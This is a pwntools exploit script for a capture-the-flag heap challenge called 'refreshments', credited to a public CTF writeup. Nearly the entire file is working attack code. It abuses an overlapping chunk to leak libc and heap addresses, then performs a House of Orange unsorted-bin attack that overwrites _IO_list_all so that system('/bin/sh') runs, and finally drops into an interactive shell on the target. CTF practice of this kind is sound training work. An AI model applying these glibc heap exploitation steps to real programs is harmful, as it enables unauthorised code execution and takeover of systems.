#!/usr/bin/env python3
from asyncio import log
from multiprocessing import context
from pwn import *
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP                         
# =========================================================
exe = './refreshments'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
ld = ELF("glibc/ld-linux-x86-64.so.2", checksec=False)
# libc = './libc.so.6'
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "127.0.0.1", 5000


gdbscript = '''
init-pwndbg
b *_IO_flush_all_lockp+256
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./refreshments"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if args.QEMU:
        gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
        for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
            gdb_args.extend(["-ex", cmd])
        Popen(gdb_args)
    elif args.DOCKER:
        gdbscript = f'''
        init-pwndbg
        set sysroot /proc/{pid}/root
        b *_IO_flush_all_lockp+256
        c
        '''.format(**locals())        
        attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='refreshments')
    else:
        attach(io, gdbscript=gdbscript)


# =========================================================
#                         EXPLOITS
# =========================================================
# Heap Protection
def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def alloc():
    io.sendlineafter(b'>> ', b'1') # Alloc 0x61 size

def free(idx):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b': ', str(idx).encode())

def edit(idx, data):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendafter(b': ', data)

def view(idx):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b': ', str(idx).encode())
    io.recvuntil(b'Glass content: ')

def exploit():
    # pwn2oown's solution script https://github.com/pwn2ooown/CTF-Writeups-Public/blob/main/2025_HTB_StackSmash_CTF/pwn_refreshments/exp.py
    global io
    io = initialize()
    with log.progress("Libc leak"), context.silent:
        for i in range(5):
            alloc()  # Fill the glass
        alloc()  # Guard
        edit(0, b'A' * 0x58 + b"\xc1")  # Overwrite the second chunk header
        free(1)  # Unsorted bin
        alloc() 
        view(2)  # View the overlapping unsorted bin chunk
        libc_leak = u64(io.recv(8))
        libc.address = libc_leak - (libc.sym["main_arena"] + 88)
        if not args.DOCKER:
            ld.address = libc.address + 0x400000
        else:
            ld.address = libc.address + 0x39f000
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base address: %#x", libc.address)
    log.info("ld base address: %#x", ld.address)

    with log.progress("Heap leak"), context.silent:
        alloc() # Clean unsortedbin
        free(0)
        free(7) # Get heap leak
        view(2)  # View the overlapping unsorted bin chunk
        heap = u64(io.recv(8))
    log.info("Heap base address: %#x", heap)
    with log.progress("House of Orange with unsorted bins attack"), context.silent:
        alloc()
        edit(6,b'D'*0x50 + b'/bin/sh\x00'+b'\xb1') 
        edit(3, b'\x00'*0x48 + p64(0x71))
        free(8)
        payload = b'B'*8 + p64(libc.sym["_IO_list_all"]-0x10) + p64(0) + p64(1)
        edit(2, payload.ljust(0x58,b'\x00')) 
        edit(4,p64(0)+ p64(heap+0x1a0) + p64(0)*3 + p64(libc.sym["system"]))
        alloc()        
        debug()
        alloc()  # Unsorted bins return
    io.interactive()

if __name__ == '__main__':
    exploit()
